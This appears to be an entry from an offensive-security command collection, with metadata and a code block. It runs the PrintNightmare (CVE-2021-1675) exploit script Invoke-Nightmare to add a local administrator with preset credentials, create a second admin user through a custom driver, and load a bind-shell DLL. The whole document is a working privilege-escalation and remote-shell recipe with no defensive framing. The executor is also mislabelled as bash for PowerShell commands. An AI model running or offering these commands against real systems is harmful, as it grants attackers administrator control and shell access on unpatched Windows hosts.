---
id: 1205903b-4d5f-4bdd-8019-ed8d32556dba
name: Add user adm1n/P@ssw0rd in the local admin group by default and execute bindshell.dll
type: command
executor: bash
data: "Import-Module .\\cve-2021-1675.ps1\nInvoke-Nightmare # add user `adm1n`/`P@ssw0rd`\
  \ in the local admin group by default\nInvoke-Nightmare -DriverName \"Dementor\"\
  \ -NewUser \"d3m3nt0r\" -NewPassword \"AzkabanUnleashed123*\" \nInvoke-Nightmare\
  \ -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\""
output: null
created_at: '2023-04-06T03:56:02.971411+00:00'
updated_at: '2023-04-10T20:26:14.546143+00:00'
---

# Add user adm1n/P@ssw0rd in the local admin group by default and execute bindshell.dll

```bash
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```


